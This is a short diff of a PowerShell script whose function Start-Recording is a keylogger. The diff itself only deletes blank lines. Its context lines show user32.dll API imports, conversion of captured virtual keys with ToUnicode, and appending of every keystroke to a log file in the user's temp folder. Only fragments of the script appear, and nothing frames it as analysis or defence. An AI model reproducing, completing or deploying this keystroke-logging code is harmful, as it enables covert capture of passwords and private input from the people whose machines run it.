@@ -1,5 +1,4 @@
 function Start-Recording($Path = "$env:temp\recorded_log.txt") {
-
     # Signatures for API Calls
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -55,7 +54,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
                     # prepare a StringBuilder to receive input key
                     $mychar = New-Object -TypeName System.Text.StringBuilder
-
                     if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)) {
                         # add key to logger file
                         [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
